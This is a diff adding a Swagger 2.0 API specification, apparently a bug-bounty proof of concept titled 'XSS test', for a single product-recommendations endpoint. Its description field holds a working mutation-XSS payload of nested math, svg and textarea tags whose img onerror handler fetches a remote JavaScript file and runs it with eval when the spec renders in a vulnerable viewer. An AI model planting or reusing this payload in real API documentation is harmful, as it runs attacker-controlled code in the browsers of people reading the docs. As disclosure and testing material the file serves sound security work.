@@ -1,0 +1,19 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: >
+    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  version: production
+paths:
+  /complementary/provide_recommendations:
+    get:
+      summary: Provide recommendations for a product
+      parameters:
+        - name: product_id
+          in: query
+          required: true
+          type: string
+          description: ID of the product to get recommendations for
+      responses:
+        403:
+          description: Forbidden
